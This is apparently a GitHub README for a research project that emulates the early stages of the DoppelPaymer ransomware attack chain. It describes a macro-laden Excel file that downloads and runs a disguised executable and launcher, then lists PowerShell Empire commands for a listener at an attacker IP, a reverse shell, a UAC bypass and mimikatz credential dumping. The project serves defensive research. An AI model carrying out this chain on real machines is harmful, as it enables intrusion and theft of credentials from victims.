# Attack Emulation of the Fore Part of Doppelpaymer Attack Chain
## Second Part of this Project
* https://github.com/chieh0613/Log-based-Anomaly-Detection-and-Tracing-back-to-Phishing-Emails

## Introduction
   An APT attack consists of various tactics, including initial access, credential access, and command and control.
   DoppelPaymer is a ransomware that have launched their attacks since 2019, threatening victims after stealing their files.
   We try to reproduce the attack scenario based on the fore part of Doppelpaymer attack chain.

## Victim's OS and requiremnts
* Edition: Windows 10 Home
* Version: 2004
* Microsoft Office
* 7-zip/WinRAR
* Windows Defender disabled

## Attacker's OS and requirements
* Kali Linux
* Empire


## Unzip
   In the folder unzip, we try to generate an executable file "unzip.exe" to extract file from "launcher.zip" with the password "123".
* Type "python run.py" to generate the file "unzip.exe".
* Requirements:
  * python==3.8.8
  * pyinstaller==4.3 

## Unzip.txt
   Because we cannot download the executable file directly, we change the file extension from .exe to .txt.
   After the modication, we can use macro to download the file directly by a given link.

## launcher.zip
   Contains the file "launcher.bat" with the password "123". 
   After executing the file "launcher.bat", the victim will connect to the empire server.

## project.xlsm
   It is a macro enabled excel document.
   The followings are what it will do:
   * Download the file "launcher.zip" to %temp% folder
   * Download the file "unzip.exe" to %temp% folder
   * Execute the file "unzip.exe" to get the file "launcher.bat"
   * Execute the file "launcher.bat" to connect to the empire server

## project.zip
    Contains project.xlsm with password '123'. 

## Empire Commands
* Generate the file "launcher.bat" to let the victim connect to the empire server:
    1. Use "uselistener http" to generate listener
      * set Name http
      * set Host 192.168.2.30 (attacker's ip)
      * set Port 8080
      * execute
    2. Use "usestager windows/launcher_bat" to generate the file "launcher.bat"
      * set Listener http
      * execute

* After the victim connects to the empire server, run the following commands:
    1. type "agents" to find the value of victim's Name (<victim_Name>)
    2. type "interact <victim_Name>"
    3. Reverse shell
      * shell tasklist
      * shell netstat
      * shell ipconfig
    4. Use "usemodule privesec/bypassuac" to get administrator privilege
      * set Listener http
      * execute
    5. Use "usemodule credentials/mimikatz/logonpasswords*" to get the victim's NTLM hash
      * execute

# Reference
* https://github.com/mishmashclone/BC-SECURITY-Empire
* https://null-byte.wonderhowto.com/how-to/use-powershell-empire-getting-started-with-post-exploitation-windows-hosts-0178664/
* https://ethicalhackingguru.com/how-to-use-powershell-empire-3-the-powershell-empire-3-tutorial/
* https://d13ot9o61jdzpp.cloudfront.net/files/Excel%204.0%20Macro%20Functions%20Reference.pdf
* https://stackoverflow.com/questions/6934169/how-to-show-current-user-name-in-a-cell
* https://vblocalhost.com/uploads/VB2020-61.pdf
* https://github.com/DarkSecDevelopers/shellpy.git

